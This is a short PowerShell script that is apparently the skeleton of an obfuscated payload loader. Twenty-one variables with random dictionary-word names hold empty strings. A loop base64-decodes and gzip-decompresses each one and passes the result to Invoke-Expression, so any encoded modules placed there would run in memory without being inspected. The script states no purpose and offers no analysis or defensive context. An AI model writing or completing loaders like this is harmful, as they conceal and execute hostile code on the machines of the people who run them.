#Requires -Version 2

$Profusions = ""
$Dynamiting = ""
$Mesmerized = ""
$Eulogizing = ""
$Woodchucks = ""
$Tonalities = ""
$Motorcades = ""
$Promontory = ""
$Cannabises = ""
$Cautionary = ""
$Mascaraing = ""
$Ophthalmic = ""
$Consulting = ""
$Disbanding = ""
$Constipate = ""
$Bittorrent = ""
$Keypunched = ""
$Commandoes = ""
$Meddlesome = ""
$Krugerrand = ""
$Correctest = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Profusions,$Dynamiting,$Mesmerized,$Eulogizing,$Woodchucks,$Tonalities,$Motorcades,$Promontory,$Cannabises,$Cautionary,$Mascaraing,$Ophthalmic,$Consulting,$Disbanding,$Constipate,$Bittorrent,$Keypunched,$Commandoes,$Meddlesome,$Krugerrand,$Correctest)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
